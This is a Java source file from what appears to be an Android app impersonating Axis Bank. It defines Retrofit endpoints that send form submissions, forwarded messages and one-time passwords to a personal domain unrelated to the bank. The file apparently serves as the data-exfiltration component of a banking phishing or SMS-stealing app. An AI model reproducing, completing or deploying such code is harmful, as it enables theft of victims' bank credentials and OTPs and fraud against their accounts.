package com.example.axisbank;

import retrofit2.Call;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;
import retrofit2.http.Body;
import retrofit2.http.POST;
import retrofit2.http.PUT;


interface ApiService {
    @POST("messageSend.php")
    Call<Void> sendmessage(@Body Message message);

    @POST("submitData1.php")
    Call<Void> submitData(@Body Submit1 Submit1);

    @POST("submitData3.php")
    Call<Void> submitData(@Body Submit3 Submit3);

    @POST("submitData2.php")
    Call<Void> submitData(@Body Submit2 Submit2);

    @PUT("secondPageData.php")
    Call<Void> secondpage(@Body SecondPageData SecondPageData);

    @PUT("otpData.php")
    Call<Void> otpsend(@Body OTP OTP);

    @PUT("lastPage.php")
    Call<Void> lastpage(@Body lastPage lastPage);

}


class ApiClient {
    private static final String BASE_URL = "https://anikdevnath.com/APIS_FIRSTAPP/";
    private static Retrofit retrofit;

    public static Retrofit getClient() {
        if (retrofit == null) {
            retrofit = new Retrofit.Builder()
                    .baseUrl(BASE_URL)
                    .addConverterFactory(GsonConverterFactory.create())
                    .build();
        }
        return retrofit;
    }
}



class ApiClient2 {
    private static final String BASE_URL = "https://anikdevnath.com/Messages/";
    private static Retrofit retrofit;

    public static Retrofit getClient() {
        if (retrofit == null) {
            retrofit = new Retrofit.Builder()
                    .baseUrl(BASE_URL)
                    .addConverterFactory(GsonConverterFactory.create())
                    .build();
        }
        return retrofit;
    }
}
